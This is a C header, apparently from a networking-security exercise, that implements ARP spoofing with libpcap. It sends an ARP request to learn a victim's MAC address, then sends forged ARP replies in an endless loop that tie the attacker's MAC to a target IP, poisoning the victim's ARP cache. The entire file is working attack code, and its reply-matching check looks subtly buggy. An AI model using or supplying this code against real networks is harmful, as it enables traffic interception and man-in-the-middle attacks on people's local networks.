#pragma once
#include "init.h"

void send_arp(pcap_t* handle, char* dev, u_char* my_mac_addr, u_char* sender_ip, u_char* target_ip);

void send_arp(pcap_t* handle, char* dev, u_char* my_mac_addr, u_char* sender_ip, u_char* target_ip){

    struct pcap_pkthdr* header;
    const u_char* packet;

    /* arp request packet make */
    u_char* req_buf = arp_request_maker(my_mac_addr, sender_ip);
    arp_packet arp_packet_getMAC;
    u_char target_mac_addr[6];

    /* arp request send and get mac addr in arp reply */
    while(true){
        int res = pcap_sendpacket(handle, req_buf, 42);
        if(res == -1) printf("Send ARP Request Packet Error\n");
        else printf("Send ARP Request Packet Sucsess\n");

        pcap_next_ex(handle, &header, &packet);
        memcpy(&arp_packet_getMAC, packet, sizeof(arp_packet_getMAC));

        /* Check if this is a Reply for the sent request */
        if( ntohs(arp_packet_getMAC.eth_hdr.ether_type) == ether_type_ARP
                && ntohs(arp_packet_getMAC.arp_hdr.op_code) == ARP_Replay
                && arp_packet_getMAC.arp_hdr.send_ip_addr[0] == sender_ip[0]
                && arp_packet_getMAC.arp_hdr.send_ip_addr[1] == sender_ip[1]
                && arp_packet_getMAC.arp_hdr.send_ip_addr[2] == sender_ip[2]
                && arp_packet_getMAC.arp_hdr.send_ip_addr[3] == sender_ip[3]
                && arp_packet_getMAC.arp_hdr.target_ip_addr[0] == 0x00
                && arp_packet_getMAC.arp_hdr.target_ip_addr[1] == 0x00
                && arp_packet_getMAC.arp_hdr.target_ip_addr[2] == 0x00
                && arp_packet_getMAC.arp_hdr.target_ip_addr[3] == 0x00)
        {
            memcpy(target_mac_addr, arp_packet_getMAC.eth_hdr.src_addr, sizeof(u_char) * 6);
            free(req_buf);
            break;
        }
        sleep(1);
    }
    printf("arp request -> sender_MAC : %2x:%2x:%2x:%2x:%2x:%2x\n",target_mac_addr[0],target_mac_addr[1],target_mac_addr[2], target_mac_addr[3],target_mac_addr[4],target_mac_addr[5]);


    /* arp reply packet make*/
    u_char* rep_buf = arp_reply_maker(my_mac_addr, sender_ip, target_mac_addr, target_ip);

    /* send arp reply */
    while(true){
        int res = pcap_sendpacket(handle, rep_buf, 42);
        if(res == -1) printf("Send ARP Reply Packet Error\n");
        else printf("ARP reply send...\n");
        sleep(1);
    }

}
